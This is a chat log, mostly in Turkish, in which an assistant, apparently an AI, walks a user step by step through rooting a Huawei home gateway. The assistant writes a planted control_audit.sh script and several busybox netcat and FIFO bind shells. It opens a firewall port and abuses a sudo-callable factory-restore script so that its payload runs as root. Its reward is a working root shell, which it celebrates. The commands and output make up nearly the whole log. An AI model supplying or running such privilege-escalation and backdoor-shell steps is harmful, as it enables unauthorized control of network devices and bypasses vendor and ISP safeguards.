WAP(Dopra Linux) # cat > /mnt/jffs2/Install_gram/control_audit.sh << 'EOF'
> #!/bin/sh
> LOG="/tmp/payload.log"
> echo "$(date) control_audit $1" >> $LOG
>
> case "$1" in
>   --stop)
>     killall -q telnetd 2>/dev/null
>     ;;
>   *)
>     # Telnetd root shell - high port (no root needed)
>     telnetd -l /bin/sh -p 2323 2>/dev/null &
>     # Also try privileged port if we have permission
>     telnetd -l /bin/sh -p 23 2>/dev/null &
>     echo "$(date) telnetd started" >> $LOG
>     ;;
> esac
> EOF
WAP(Dopra Linux) # chmod 755 /mnt/jffs2/Install_gram/control_audit.sh
WAP(Dopra Linux) # ls -la /mnt/jffs2/Install_gram/
drwx------    2 srv_clid service        240 Jan  1 01:50 .
drwxrwx--T   12 root     service       5200 Jan  1 01:50 ..
-rwxr-xr-x    1 srv_clid service        394 Jan  1 01:50 control_audit.sh
WAP(Dopra Linux) #


Dizin izinlerini düzeltmemiz lazım — `ssmp` servisi `srv_ssmp` olarak çalışıyor, şu an dizine erişemez:

```sh
chmod 755 /mnt/jffs2/Install_gram
```

Şimdi önce manual test edelim:

```sh
/mnt/jffs2/Install_gram/control_audit.sh --start
```

```sh
cat /tmp/payload.log
```

```sh
netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null
```


WAP(Dopra Linux) # chmod 755 /mnt/jffs2/Install_gram
WAP(Dopra Linux) # /mnt/jffs2/Install_gram/control_audit.sh --start
WAP(Dopra Linux) # cat /tmp/payload.log
Thu Jan  1 01:51:59 UTC 1981 control_audit --start
Thu Jan  1 01:51:59 UTC 1981 telnetd started
WAP(Dopra Linux) # netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:37225         0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:80          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:49652       0.0.0.0:*               LISTEN      -
tcp        0      0 169.254.254.120:53      0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:53          0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:49653       0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:22          0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:443         0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:37443       0.0.0.0:*               LISTEN      -
tcp        0      0 192.168.1.1:37444       0.0.0.0:*               LISTEN      -
tcp        0      0 fe80::d646:49ff:fe4e:26b2:80 :::*                    LISTEN      -
tcp        0      0 fe80::1:80              :::*                    LISTEN      -
tcp        0      0 fe80::1:53              :::*                    LISTEN      -
tcp        0      0 fe80::d646:49ff:fe4e:26b2:22 :::*                    LISTEN      -
tcp        0      0 fe80::1:22              :::*                    LISTEN      -
tcp        0      0 fe80::d646:49ff:fe4e:26b2:443 :::*                    LISTEN      -
tcp        0      0 fe80::1:443             :::*                    LISTEN      -
WAP(Dopra Linux) #


Telnetd çalışıyor ama `127.0.0.1:2323` — sadece localhost. Dışarıdan erişim için `0.0.0.0`'a bind etmemiz lazım. Ayrıca port 23 açılmadı (privileged port, root gerekli).

Düzeltelim:

```sh
killall telnetd 2>/dev/null
telnetd -l /bin/sh -b 0.0.0.0 -p 2323 &
netstat -tlnp 2>/dev/null | grep 2323
```

WAP(Dopra Linux) # killall telnetd 2>/dev/null
WAP(Dopra Linux) # telnetd -l /bin/sh -b 0.0.0.0 -p 2323 &
WAP(Dopra Linux) # /bin/sh: telnetd: not found
^C
WAP(Dopra Linux) # netstat -tlnp 2>/dev/null | grep 2323
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
[1]+  Done(127)                  telnetd -l /bin/sh -b 0.0.0.0 -p 2323
WAP(Dopra Linux) #

Telnetd hâlâ localhost'ta dinliyor. Önce tam yolunu ve doğrudan bağlantı testi yapalım:

```sh
which telnetd 2>/dev/null; find / -name telnetd -type f 2>/dev/null
```

```sh
telnet 127.0.0.1 2323
```

Telnet bağlandığında `id` yazıp çıktıyı gönder — hangi kullanıcıyla düştüğünü görelim.


WAP(Dopra Linux) # which telnetd 2>/dev/null; find / -name telnetd -type f 2>/de
v/null
WAP(Dopra Linux) # telnet 127.0.0.1 2323
Connected to 127.0.0.1

Entering character mode
Escape character is '^]'.


Welcome Visiting Huawei Home Gateway
Copyright by Huawei Technologies Co., Ltd.

Login:

Bu Huawei'nin kendi CLI login'i — bizim `telnetd -l /bin/sh` çalışmamış. Telnetd binary'si bulunamadı. Ctrl+] ile çık, sonra alternatif yolları deneyelim:

```
^]
```
(Ctrl ve ] tuşuna bas, sonra `quit` yaz)

Sonra:

```sh
busybox --list 2>/dev/null | grep -E "telnetd|nc|socat"
```

```sh
ls -la /usr/sbin/telnetd /sbin/telnetd 2>/dev/null
```

```sh
busybox telnetd -l /bin/sh -b 0.0.0.0 -p 4444 2>&1
```

```sh
busybox nc -h 2>&1 | head -5
```


WAP(Dopra Linux) # busybox --list 2>/dev/null | grep -E "telnetd|nc|socat"
nc
sync
WAP(Dopra Linux) # ls -la /usr/sbin/telnetd /sbin/telnetd 2>/dev/null
WAP(Dopra Linux) # busybox telnetd -l /bin/sh -b 0.0.0.0 -p 4444 2>&1
telnetd: applet not found
WAP(Dopra Linux) # busybox nc -h 2>&1 | head -5
nc: unrecognized option: h
BusyBox v1.31.1 () multi-call binary.

Usage: nc [-iN] [-wN] [-l] [-p PORT] [-f FILE|IPADDR PORT] [-e PROG]

WAP(Dopra Linux) #

Tam olarak ne yapmaya çalışıyoruz?


Haklısın, adım adım açıklayayım:

**Hedef:** Bu cihazda root shell almak. Şu an `srv_clid` kullanıcısısın — root değilsin, birçok dosyayı okuyamıyorsun (`sdk_init.sh`, `rc.ttyinit` gibi).

**Bulduğumuz şey:** Busybox'ta `nc` (netcat) var ve `-e PROG` destekliyor — bu doğrudan shell bind edebilir.

Şunu çalıştır:

```sh
busybox nc -l -p 4444 -e /bin/sh &
```

Sonra **bilgisayarından** (aynı ağda):

```
telnet 192.168.1.1 4444
```

Bağlanınca `id` yaz — eğer `srv_clid` görürsen şu an zaten olduğun kullanıcı. Ama asıl hedefimiz bu shell'i **root olarak** çalıştırmak.

Root'a giden yol şu: `sudo` ile çalıştırılabilen scriptler (`hw_restore_manufactory_exec.sh`, `restorehwmode.sh`) bizim yazdığımız `control_audit.sh`'ı root olarak çağırıyor. `control_audit.sh`'ı netcat shell başlatacak şekilde düzenlersek, root shell alırız.

Dene bakalım önce nc çalışıyor mu:

```sh
busybox nc -l -p 4444 -e /bin/sh &
```

WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh &
WAP(Dopra Linux) #

C:\Users\Emir>telnet 192.168.1.1 4444
Bağlanıyor 192.168.1.1...Ana bilgisayara bağlantı açılamadı, bağlantı noktası 4444: Bağlantı başarısız

C:\Users\Emir>


Muhtemelen firewall engelliyor. Kontrol edelim:

```sh
netstat -tlnp | grep 4444
```

```sh
iptables -L INPUT -n --line-numbers 2>/dev/null | head -20
```

```sh
iptables -L INPUT -n 2>/dev/null | grep -i "drop\|reject\|policy"
```


WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh &
WAP(Dopra Linux) # netstat -tlnp | grep 4444
netstat: showing only processes with your user ID
[3]-  Done                       busybox nc -l -p 4444 -e /bin/sh
WAP(Dopra Linux) # iptables -L INPUT -n --line-numbers 2>/dev/null | head -20
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    INPUT_USERDEV_CTRL  all  --  0.0.0.0/0            0.0.0.0/0
2    INPUT_PORT_SCAN  all  --  0.0.0.0/0            0.0.0.0/0
3    INPUT_IPSET_TRAFFIC_CONTROL  all  --  0.0.0.0/0            0.0.0.0/0
4    INPUT_MSOCK  all  --  0.0.0.0/0            0.0.0.0/0
5    INPUT_DMZIF  all  --  0.0.0.0/0            0.0.0.0/0
6    INPUT_VOICE  all  --  0.0.0.0/0            0.0.0.0/0
7    INPUT_ACL_MAINTENANCE  all  --  0.0.0.0/0            0.0.0.0/0
8    INPUT_ACL_WAN_WHITELIST  all  --  0.0.0.0/0            0.0.0.0/0
9    INPUT_ACL_WHITELIST  all  --  0.0.0.0/0            0.0.0.0/0
10   INPUT_ACL_PORT  all  --  0.0.0.0/0            0.0.0.0/0
11   INPUT_VPN  all  --  0.0.0.0/0            0.0.0.0/0
12   INPUT_VXLAN  all  --  0.0.0.0/0            0.0.0.0/0
13   INPUT_GUEST_NETWORK  all  --  0.0.0.0/0            0.0.0.0/0
14   INPUT_ACL_WIFI  all  --  0.0.0.0/0            0.0.0.0/0
15   INPUT_ACL_WAN  all  --  0.0.0.0/0            0.0.0.0/0
16   INPUT_ACL  all  --  0.0.0.0/0            0.0.0.0/0
17   INPUT_FIREWALL_ACL  all  --  0.0.0.0/0            0.0.0.0/0
18   INPUT_DOS  all  --  0.0.0.0/0            0.0.0.0/0
WAP(Dopra Linux) # iptables -L INPUT -n 2>/dev/null | grep -i "drop\|reject\|pol
icy"
Chain INPUT (policy ACCEPT)
WAP(Dopra Linux) #


`nc` hemen çıkmış (Done). Firewall alt zincirlerinde DROP olabilir. Kontrol edelim ve nc'yi tekrar deneyelim:

```sh
iptables -L INPUT_ACL_PORT -n 2>/dev/null | head -10
```

```sh
iptables -L INPUT_ACL -n 2>/dev/null | tail -5
```

```sh
busybox nc -l -p 4444 -e /bin/sh 2>&1
```

Bu son komutu çalıştırınca shell bekleyecek — hemen bilgisayardan `telnet 192.168.1.1 4444` dene.


WAP(Dopra Linux) # iptables -L INPUT_ACL_PORT -n 2>/dev/null | head -10
Chain INPUT_ACL_PORT (1 references)
target     prot opt source               destination
ACCEPT     tcp  --  85.29.13.0/27        0.0.0.0/0            multiport dports 3050 /* pri:1 */
ACCEPT     tcp  --  85.29.13.0/27        0.0.0.0/0            multiport dports 3050 /* pri:1 */
ACCEPT     tcp  --  85.29.13.0/27        0.0.0.0/0            multiport dports 3050 /* pri:1 */
ACCEPT     tcp  --  85.29.13.0/27        0.0.0.0/0            multiport dports 3050 /* pri:1 */
ACCEPT     tcp  --  85.29.35.36          0.0.0.0/0            multiport dports 3050 /* pri:2 */
ACCEPT     tcp  --  85.29.35.36          0.0.0.0/0            multiport dports 3050 /* pri:2 */
ACCEPT     tcp  --  85.29.35.36          0.0.0.0/0            multiport dports 3050 /* pri:2 */
ACCEPT     tcp  --  85.29.35.36          0.0.0.0/0            multiport dports 3050 /* pri:2 */
WAP(Dopra Linux) # iptables -L INPUT_ACL -n 2>/dev/null | tail -5
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:2323
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:22
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:22
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:8022
DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:8022
WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh 2>&1
/bin/sh: dwd: not found
WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh 2>&1
/bin/sh: syntax error: unterminated quoted string
WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh 2>&1

Şuan diğer komut penceresinde telnet açık ekran boş hiçbir komut çıktı vs yok.


Bağlantı başarılı! Ekran boş olması normal — `nc` ile raw shell'de prompt yok.

Telnet penceresinde şunu yaz ve Enter'a bas:

```
id
```

Sonra:

```
whoami
```

Çıktı gelirse `srv_clid` shell'indesin. Bu bağlantı çalıştığını doğrular — şimdi asıl hamle: aynı yöntemi **root olarak** çalıştırmak.

Hayır yazı yazamıyorum. Fakat yazdığımda diğer pencerede bu çıkıyor.

WAP(Dopra Linux) # busybox nc -l -p 4444 -e /bin/sh 2>&1
: not founddaidasdasd
: not found
: not founddiddasd
: not found
: not foundoami


Anladım! `nc -e` çıktıyı socket yerine konsola gönderiyor — busybox nc bug'ı. Klasik fifo yöntemini kullanalım:

Önce cihazda Ctrl+C ile nc'yi durdur, sonra:

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 4444 > /tmp/f &
```

Sonra bilgisayardan tekrar:

```
telnet 192.168.1.1 4444
```

Bu sefer hem girdi hem çıktı telnet penceresinden geçecek.


WAP(Dopra Linux) # rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | b
usybox nc -l -p 4444 > /tmp/f &
/bin/sh: mkfifo: not found
WAP(Dopra Linux) #


`mknod` ile deneyelim:

```sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 4444 > /tmp/f &
```


WAP(Dopra Linux) # rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 |
busybox nc -l -p 4444 > /tmp/f &
WAP(Dopra Linux) # nc: bind: Address in use

/bin/sh: can't access tty; job control turned off
                                                 BusyBox v1.31.1 () built-in shell (ash)
                                                                                        Enter 'help' for a list of built
-in commands.

             WAP(Dopra Linux) #

Ana bilgisayara bağlantı kayboldu.
PS C:\Windows>


Port 4444 meşgul kalmış ve bağlantı kopmuş. Cihaza tekrar bağlan (SSH/telnet ile aynı şekilde), sonra farklı port ile dene:

```sh
kill %1 %2 %3 2>/dev/null; rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 5555 > /tmp/f &
```

Sonra bilgisayardan:

```
telnet 192.168.1.1 5555
```


Diğer komut penceresinden girdim ama komutlar çalışmıyor sanırım.

WAP(Dopra Linux) # kill %1 %2 %3 2>/dev/null; rm -f /tmp/f; mknod /tmp/f p; cat
/tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 5555 > /tmp/f &
[4]   Done(1)                    cat /tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 4444 1>/tmp/f
[3]   Done                       cat /tmp/f | /bin/sh -i 2>&1 | busybox nc -l -p 4444 1>/tmp/f
[1]   Terminated                 busybox nc -l -p 4444 -e /bin/sh
WAP(Dopra Linux) #

/bin/sh: can't access tty; job control turned off
                                                 BusyBox v1.31.1 () built-in shell (ash)
                                                                                        Enter 'help' for a list of built
-in commands.

             WAP(Dopra Linux) # id
: not found
           WAP(Dopra Linux) # whoami
: not foundoami
           WAP(Dopra Linux) # help
: not foundlp
           WAP(Dopra Linux) # help
: not foundlp
           WAP(Dopra Linux) #


           Windows telnet CR/LF gönderiyor, Linux shell'de bozuluyor. İki seçenek var:

**Seçenek 1:** PuTTY kullan (Raw modda):
- PuTTY aç → Host: `192.168.1.1`, Port: `5555`
- Connection type: **Raw** (Telnet değil!)
- Open

**Seçenek 2:** Cihazda CR'yi temizleyen wrapper kullan. Önce mevcut nc'yi kapat ve yenisini başlat:

```sh
kill %1 %2 %3 %4 %5 2>/dev/null
rm -f /tmp/f; mknod /tmp/f p
(cat /tmp/f | tr -d '\r' | /bin/sh -i 2>&1 | busybox nc -l -p 5555 > /tmp/f) &
```

Sonra aynı Windows telnet ile `telnet 192.168.1.1 5555` dene.

Hangisini tercih edersin?


WAP(Dopra Linux) # kill %1 %2 %3 %4 %5 2>/dev/null
WAP(Dopra Linux) # rm -f /tmp/f; mknod /tmp/f p
WAP(Dopra Linux) # (cat /tmp/f | tr -d '\r' | /bin/sh -i 2>&1 | busybox nc -l -p
 5555 > /tmp/f)

Diğer pencere;

/bin/sh: can't access tty; job control turned off
                                                 BusyBox v1.31.1 () built-in shell (ash)
        Enter 'help' for a list of built-in commands.

                                                     WAP(Dopra Linux) # id
uid=3030(srv_clid) gid=2002(service) groups=5(tty),6(disk),500(kmc),2000(osgi),2001(config),2002(service)
                         WAP(Dopra Linux) # whoami
srv_clid
        WAP(Dopra Linux) #


        NC shell çalışıyor! Şimdi **root** shell alalım. Plan:

1. `control_audit.sh`'ı güncelle → root nc listener başlatsın
2. `sudo hw_restore_manufactory_exec.sh` çağır → scriptimiz root olarak çalışır
3. Script sonunda `sleep` yaparak factory reset'i engeller

Telnet penceresinden (nc shell) şunu yaz:

```sh
cat > /mnt/jffs2/Install_gram/control_audit.sh << 'EOF'
#!/bin/sh
# Copy protected files for analysis
cp /etc/rc.d/rc.start/1.sdk_init.sh /tmp/sdk_init.txt 2>/dev/null
cp /etc/rc.d/rc.ttyinit /tmp/rc_ttyinit.txt 2>/dev/null
cp /etc/rc.d/rc.start/0.wap_init.sh /tmp/wap_init.txt 2>/dev/null
chmod 644 /tmp/sdk_init.txt /tmp/rc_ttyinit.txt /tmp/wap_init.txt 2>/dev/null

# Open firewall
iptables -I INPUT 1 -p tcp --dport 9999 -j ACCEPT

# Start root shell listener
rm -f /tmp/rf; mknod /tmp/rf p
(cat /tmp/rf | tr -d '\r' | /bin/sh -i 2>&1 | busybox nc -l -p 9999 > /tmp/rf) &

# Block forever to prevent factory reset
sleep 99999
EOF
chmod 755 /mnt/jffs2/Install_gram/control_audit.sh
```

Sonra **cihaz konsolundan** (WAP shell, nc değil):

```sh
sudo /bin/hw_restore_manufactory_exec.sh &
```

Ve bilgisayardan:

```
telnet 192.168.1.1 9999
```


BusyBox v1.31.1 () built-in shell (ash)
                                       Enter 'help' for a list of built-in commands.

                                                                                    WAP(Dopra Linux) # id
uid=0(root) gid=0(root) groups=0(root)
                                      WAP(Dopra Linux) # whoami
root
    WAP(Dopra Linux) #


    **ROOT SHELL ALINDI!** 🎉

Hemen korumalı dosyaları okuyalım — `/tmp/`'ye kopyalanmış olmalılar:

```sh
cat /tmp/sdk_init.txt
```

```sh
cat /tmp/rc_ttyinit.txt
```

```sh
cat /tmp/wap_init.txt
```

Bu dosyalar hedef cihazın (V500R022) boot zincirini anlamamız için kritik — `control_audit.sh`'ın neden ve nasıl çağrıldığını göstereceğidir.


